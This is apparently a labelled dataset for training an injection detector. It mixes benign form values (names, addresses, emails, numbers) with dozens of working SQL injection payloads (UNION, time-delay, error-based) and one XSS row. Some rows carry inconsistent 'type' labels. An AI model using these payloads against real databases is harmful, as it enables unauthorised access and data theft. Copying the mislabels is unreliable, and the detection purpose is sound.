Text,attack_type,Label,type
churriana de la vega,norm,0,normal
1%'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'=',sqli,1,sql
"data:text/html, type=image>",xss,2,normal
1 and 7533=7533-- spzi,sqli,1,sql
"villares, los",norm,0,normal
derrick,norm,0,normal
"juan de salcedo, 158 5?f",norm,0,normal
"1%"" union all select null,null,null,null,null,null#",sqli,1,sql
"1' where 1230=1230 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1'||(select 'ylek' where 3803=3803 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||'",sqli,1,sql
humphery@natravea.uz,norm,0,normal
91704360w,norm,0,normal
5v1s582a,norm,0,normal
rainelda,norm,0,normal
pijahumeda,norm,0,normal
1%'));begin dbms_lock.sleep(5); end and (('%'=',sqli,1,sql
romberg,norm,0,normal
yasm,norm,0,normal
slaibe hipolit,norm,0,normal
2237912988616662,norm,0,normal
4337,norm,0,normal
6828,norm,0,normal
sikes,norm,0,normal
del barrio,norm,0,normal
danis,norm,0,normal
"1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('niro'='niro",sqli,1,sql
molina,norm,0,normal
"1' in boolean mode) and make_set(7804=3315,3315)#",sqli,1,normal
"1%""));if(7899=7899) select 7899 else drop function zbbp--",sqli,1,sql
"-2953"") or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""oaeh""=""oaeh",sqli,1,sql
"1' in boolean mode) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
05212,norm,0,normal
"1%""));iif(5257=5257,1,1/0)",sqli,1,sql
"1%"";begin user_lock.sleep(5); end and ""%""=""",sqli,1,sql
poblacho,norm,0,normal
gwillim.somerset@mystyleperfume.nl,norm,0,normal
"1"") where 2602=2602 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
25723,norm,0,normal
"1%"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"-2857%'))) union all select 7167,7167,7167,7167,7167,7167,7167,7167#",sqli,1,sql
3672487183730665,norm,0,normal
c/ juan perez arriete 19 13e,norm,0,normal
1059050002779044,norm,0,normal
8271,norm,0,normal
penido maym'o,norm,0,normal
abell segarras,norm,0,normal
"-3234%"")) or elt(1032=1032,3623) and ((""%""=""",sqli,1,normal
"1'||(select 'wyng' from dual where 2157=2157 union all select null,null--",sqli,1,sql
induracin,norm,0,normal
ochoa7,norm,0,normal
21388,norm,0,normal
peguera,norm,0,normal
aceitn,norm,0,normal
92269883r,norm,0,normal
"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",sqli,1,sql
donet acst,norm,0,normal
"-9462"") as vzga where 4799=4799 or 8691=1048",sqli,1,normal
2753394337556822,norm,0,normal
"1) and elt(3138=1817,1817)",sqli,1,normal
afijacin,norm,0,normal
1)) as gocb where 4335=4335;select case when 8227=1229 then 1 else null end--,sqli,1,sql
16359311d,norm,0,normal
-5211 union all select 1754--,sqli,1,sql
loomis@menorca.com.bb,norm,0,normal
"1' or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
ebony,norm,0,normal
mallari,norm,0,normal
1565,norm,0,normal
"1"")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""opgb"" like ""opgb",sqli,1,sql
l1brad80o,norm,0,normal
selk@inversioneolica.ee,norm,0,normal
1 where 1092=1092;waitfor delay '0:0:5'--,sqli,1,sql
san vicente de arvalo,norm,0,normal
marra,norm,0,normal
viladomat gasull,norm,0,normal
1;begin dbms_lock.sleep(5); end,sqli,1,sql
f983ga2783,norm,0,normal
1'+(select bgbq where 1589=1589 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+',sqli,1,sql
deltell riberas,norm,0,normal
36830,norm,0,normal
8355546144248132,norm,0,normal
vitalia,norm,0,normal
1) as ztrb where 1052=1052 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
1'))) and 7401=9838#,sqli,1,normal
-4960') union all select 5300--,sqli,1,sql
"-5145' where 2334=2334 union all select 2334,2334,2334,2334--",sqli,1,sql
"1"" where 3274=3274 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
offers,norm,0,normal
sharmila,norm,0,normal
"1%"")) and 8407=(select count(*) from generate_series(1,5000000)) and ((""%""=""",sqli,1,sql
33371147x,norm,0,normal
7348,norm,0,normal
45641,norm,0,normal
1) or sleep(5)#,sqli,1,normal
"-2032%""))) or (3082=7155)*7155 and (((""%""=""",sqli,1,normal
"-2216)) as hxmq where 5677=5677 union all select 5677,5677--",sqli,1,sql
97084633t,norm,0,normal
"1%"")));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
993,norm,0,normal
82380804w,norm,0,normal
-8023' or 6872=6872,sqli,1,normal
